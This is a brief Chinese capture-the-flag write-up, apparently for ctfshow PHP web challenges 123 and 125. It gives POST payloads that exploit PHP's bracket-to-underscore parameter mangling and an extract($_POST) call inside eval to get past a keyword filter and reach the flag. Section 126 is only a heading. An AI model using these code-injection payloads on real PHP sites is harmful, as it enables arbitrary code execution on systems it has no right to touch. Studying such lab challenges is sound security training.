**123**
![image copy 10.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272105766_image_copy_10.png)
`CTF_SHOW=1&CTF[SHOW.COM=2&fun=echo $flag`
突破到eval时就可以拿到flag了
**125**
![image copy 11.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272107370_image_copy_11.png)
`CTF_SHOW=1&CTF[SHOW.COM=2&fun=extract($_POST)&fl0g=flag_give_me`

`$c=$_POST['fun'];`，所以我们让` fun=extract($_POST)`
检查正则：`preg_match("/.../i", $c)`，我们的 `extract($_POST)` 里没有被禁止的关键词（flag、echo 等），且长度 <=16，可以通过。
执行 `eval("$c;")`
`eval("extract($_POST);");` 执行后，$_POST 里的所有参数都会被注册为变量。
执行 `extract($_POST)` 后，就会自动创建 `$fl0g = "flag_give_me"`


**126**













































































